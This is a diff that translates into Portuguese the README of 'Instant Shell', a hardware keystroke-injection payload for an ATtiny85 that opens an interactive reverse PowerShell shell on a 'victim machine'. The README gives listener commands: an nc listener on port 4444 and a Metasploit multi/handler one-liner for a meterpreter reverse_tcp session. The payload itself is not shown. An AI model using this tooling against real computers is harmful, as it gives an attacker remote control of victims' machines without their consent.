@@ -1,15 +1,15 @@
 # Instant Shell
 
-### Description:
+### Descrição:
 
 #### 1: Instant_Shell.ino:<br>
 
-**Payload by:** [hum4nG0D](https://github.com/hum4nG0D/)
+**Payload por:** [hum4nG0D](https://github.com/hum4nG0D/)
 
-Get instant interactive reverse powershell shell in less than a minute and send commands remotely to victim machine. Interactive reverse Powershell shell script from [Nikhil SamratAshok Mittal](http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html)
+Obtenha um shell PowerShell interativo reverso em menos de um minuto e envie comandos remotamente para a máquina da vítima. Script interativo de shell PowerShell reverso por [Nikhil SamratAshok Mittal](http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html)
 
-**Instructions:**
-Start an nc listener or metasploit listener. Be sure to change IP and Port. Adjust script delay which suits best to your computer.
+**Instruções:**
+Inicie um listener nc ou um listener metasploit. Certifique-se de alterar o IP e a porta. Ajuste o atraso do script conforme o necessário para o seu computador.
 
 ```
 nc -lvnp 4444
@@ -19,7 +19,7 @@ nc -lvnp 4444
 msfconsole -x "use multi/handler;set payload windows/x64/meterpreter/reverse_tcp; set lhost <IP_ADDRESS>; set lport 4444; set ExitOnSession false; exploit -j"
 ```
 
-**Tested on:**<br>
-**OS**: Windows 10|11<br>
-**User**: Admin/Normal User<br>
+**Testado em:**<br>
+**Sistema Operacional**: Windows 10|11<br>
+**Usuário**: Administrador/Usuário Normal<br>
 **Hardware**: ATtiny85
